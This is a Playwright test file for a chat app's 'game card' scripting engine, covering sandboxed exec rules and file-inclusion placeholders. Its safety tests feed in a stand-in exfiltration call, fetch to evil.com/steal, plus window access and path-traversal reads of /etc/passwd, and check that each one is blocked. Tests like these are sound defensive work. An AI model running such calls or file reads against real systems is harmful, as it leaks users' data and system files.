/**
 * E2E Tests: Exec runtime and file content safety with mocked API
 */
const { test, expect } = require('@playwright/test');
const { setupHooks } = require('./mockApiTestHelpers');

test.describe.configure({ mode: 'serial' });

const { configureApp, send, openAiStream, getAppHelper } = setupHooks();

function writeCardFile(cardId, relativePath, content) {
  const fs = require('fs');
  const pathLib = require('path');
  const userDataDir = getAppHelper().userDataDir;
  const filePath = pathLib.join(userDataDir, 'game-cards', 'cards', cardId, relativePath);
  fs.mkdirSync(pathLib.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, content, 'utf-8');
}

// ---------------------------------------------------------------------------
// 1. Exec runtime in e2e pipeline
// ---------------------------------------------------------------------------

test.describe('Exec runtime in e2e pipeline', () => {
  test('exec mutates state with dice roll', async () => {
    const card = {
      version: '1.0', id: 'dice', name: 'Dice',
      rules: [{
        when: { phase: 'pre_send', any: { content: { contains: 'attack' } } },
        then: [{ type: 'exec', source: 'const dmg = utils.roll("1d6"); state.damage = dmg; messages.push({ role: "system", content: "dealt " + dmg + " damage", ttl: 1, _meta: { visibility: "llm_only" } }); return { messages, state };' }]
      }]
    };
    await configureApp(card);
    const requests = [];
    await getAppHelper().window.route('https://game-card.local/**', async route => {
      requests.push(JSON.parse(route.request().postData()));
      await route.fulfill({ status: 200, contentType: 'text/event-stream', body: openAiStream('hit!') });
    });
    await send('attack the goblin');
    await expect.poll(() => requests.length).toBe(1);
    const damageMsg = requests[0].messages.find(m => m.content && m.content.startsWith('dealt '));
    expect(damageMsg).toBeDefined();
    expect(damageMsg.content).toMatch(/^dealt \d+ damage$/);
  });

  test('exec clamps values with utils.clamp', async () => {
    const card = {
      version: '1.0', id: 'clamp', name: 'Clamp',
      state: { hp: 3 },
      rules: [{
        when: { phase: 'pre_send' },
        then: [{ type: 'exec', source: 'state.hp = utils.clamp(state.hp - 10, 0, 100); return { messages, state };' }]
      }]
    };
    await configureApp(card);
    const result = await getAppHelper().evaluate(({ card }) => {
      return window.applyGameCard({ card, phase: 'pre_send', messages: [{ role: 'user', content: 'hurt' }], state: { hp: 3 } });
    }, { card });
    expect(result.state.hp).toBe(0);
  });

  test('exec inserts and removes messages', async () => {
    const card = {
      version: '1.0', id: 'exec_msg', name: 'Exec Msg',
      rules: [{
        when: { phase: 'after_response', last: { role: 'assistant' } },
        then: [{
          type: 'exec',
          source: 'messages.push({ role: "system", content: "narrator: the scene shifts", ttl: 3, _meta: { visibility: "user_visible" } }); return { messages };'
        }]
      }]
    };
    await configureApp(card);
    await getAppHelper().window.route('https://game-card.local/**', async route => {
      await route.fulfill({ status: 200, contentType: 'text/event-stream', body: openAiStream('scene desc') });
    });
    await send('look around');
    await expect.poll(async () => (await getAppHelper().getChatHistory()).messages.length).toBeGreaterThanOrEqual(3);
    const saved = (await getAppHelper().getChatHistory()).messages;
    const narratorMsg = saved.find(m => m.content === 'narrator: the scene shifts');
    expect(narratorMsg).toBeDefined();
    expect(narratorMsg.ttl).toBe(2);
  });

  test('exec error captured in trace', async () => {
    const card = {
      version: '1.0', id: 'exec_err', name: 'Exec Err',
      rules: [{ when: { phase: 'pre_send' }, then: [{ type: 'exec', source: 'return { messages: "not an array" };' }] }]
    };
    await configureApp(card);
    const result = await getAppHelper().evaluate(({ card }) => {
      return window.applyGameCard({ card, phase: 'pre_send', messages: [{ role: 'user', content: 'test' }], state: {} });
    }, { card });
    expect(result.trace.errors.length).toBeGreaterThan(0);
    expect(result.trace.errors[0]).toContain('exec messages must be valid message objects');
  });

  test('exec blocks fetch in browser', async () => {
    const card = {
      version: '1.0', id: 'block_fetch', name: 'Block Fetch',
      rules: [{ when: { phase: 'pre_send' }, then: [{ type: 'exec', source: 'return fetch("https://evil.com/steal");' }] }]
    };
    await configureApp(card);
    const result = await getAppHelper().evaluate(({ card }) => {
      return window.applyGameCard({ card, phase: 'pre_send', messages: [{ role: 'user', content: 'test' }], state: {} });
    }, { card });
    expect(result.trace.errors.length).toBeGreaterThan(0);
    expect(result.trace.errors[0]).toContain('blocked browser runtime token');
  });

  test('exec blocks window access in browser', async () => {
    const card = {
      version: '1.0', id: 'block_window', name: 'Block Window',
      rules: [{ when: { phase: 'pre_send' }, then: [{ type: 'exec', source: 'return window.document; ' }] }]
    };
    await configureApp(card);
    const result = await getAppHelper().evaluate(({ card }) => {
      return window.applyGameCard({ card, phase: 'pre_send', messages: [{ role: 'user', content: 'test' }], state: {} });
    }, { card });
    expect(result.trace.errors.length).toBeGreaterThan(0);
    expect(result.trace.errors[0]).toContain('blocked browser runtime token');
  });
});

// ---------------------------------------------------------------------------
// 2. File content and path safety
// ---------------------------------------------------------------------------

test.describe('File content and path safety', () => {
  test('valid file_content resolved through IPC', async () => {
    const card = {
      version: '1.0', id: 'file_ok', name: 'File OK',
      rules: [{
        when: { phase: 'pre_send' },
        then: [{ type: 'insert', predicate: { index: 0 }, role: 'system', content: '{{file_content:rules/core.md}}', _meta: { visibility: 'llm_only' } }]
      }]
    };
    await configureApp(card);
    writeCardFile(card.id, 'rules/core.md', 'Core rule: no metagaming.');
    const requests = [];
    await getAppHelper().window.route('https://game-card.local/**', async route => {
      requests.push(JSON.parse(route.request().postData()));
      await route.fulfill({ status: 200, contentType: 'text/event-stream', body: openAiStream('ok') });
    });
    await send('start');
    await expect.poll(() => requests.length).toBe(1);
    expect(requests[0].messages[0]).toEqual({ role: 'system', content: 'Core rule: no metagaming.' });
  });

  test('path traversal with ../ rejected before API call', async () => {
    const card = {
      version: '1.0', id: 'file_bad', name: 'File Bad',
      rules: [{
        when: { phase: 'pre_send' },
        then: [{ type: 'insert', predicate: { index: 0 }, role: 'system', content: '{{file_content:../../etc/passwd}}' }]
      }]
    };
    await configureApp(card);
    let requestCount = 0;
    await getAppHelper().window.route('https://game-card.local/**', async route => {
      requestCount++;
      await route.fulfill({ status: 200, contentType: 'text/event-stream', body: openAiStream('bad') });
    });
    await send('start');
    await expect(getAppHelper().window.locator('.chat-history')).toContainText('file_content path must stay inside game card directory');
    expect(requestCount).toBe(0);
  });

  test('absolute path rejected', async () => {
    const card = {
      version: '1.0', id: 'file_abs', name: 'File Abs',
      rules: [{
        when: { phase: 'pre_send' },
        then: [{ type: 'insert', predicate: { index: 0 }, role: 'system', content: '{{file_content:/etc/passwd}}' }]
      }]
    };
    await configureApp(card);
    let requestCount = 0;
    await getAppHelper().window.route('https://game-card.local/**', async route => {
      requestCount++;
      await route.fulfill({ status: 200, contentType: 'text/event-stream', body: openAiStream('bad') });
    });
    await send('start');
    expect(requestCount).toBe(0);
  });
});
